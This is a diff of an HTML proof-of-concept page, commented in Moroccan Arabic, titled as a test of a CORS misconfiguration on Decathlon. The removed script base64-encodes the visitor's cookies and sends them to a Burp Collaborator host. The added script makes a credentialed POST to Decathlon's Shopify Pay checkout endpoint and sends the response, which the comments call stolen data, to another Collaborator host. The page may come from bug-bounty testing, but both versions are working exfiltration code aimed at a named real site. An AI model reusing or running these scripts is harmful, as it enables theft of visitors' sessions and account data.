@@ -1,21 +1,22 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PoC CORS Bypass</title>
+</head>
 <body>
+    <h1>Testing CORS Misconfiguration on Decathlon</h1>
     <script>
-        (function(){
-            // الكود اللي كيسحب الكوكيز كاملة ويشفرها بـ Base64
-            var cookies = btoa(document.cookie) || "NO_COOKIES";
-            
-            // الرابط الجديد ديالك (تأكدت بلي ما كاينش مسافات)
-            var brupUrl = "https://uywypyix1k868hn4sadmjxyej5pwdm1b.oastify.com/?data=" + cookies;
-            
-            // إرسال التبليغ
-            fetch(brupUrl, {mode: 'no-cors'});
-            
-            // احتياط: إرسال عبر Image في حالة فشل الـ fetch
-            var i = new Image();
-            i.src = brupUrl + "&type=img";
-        })();
+        // هاد الكود اللي غايسرق الـ Response
+        fetch("https://www.decathlon.com/shopify_pay/accelerated_checkout", {
+            method: "POST",
+            credentials: "include" 
+        })
+        .then(response => response.text())
+        .then(data => {
+            // صيفط الداتا المسروقة لـ Collaborator ديالك مشفرة بـ Base64
+            fetch("https://bq5fhfaet10n0yflkr53beqvbmhd58tx.oastify.com/?exfil=" + btoa(unescape(encodeURIComponent(data))));
+        })
+        .catch(err => console.error("Error:", err));
     </script>
 </body>
 </html>
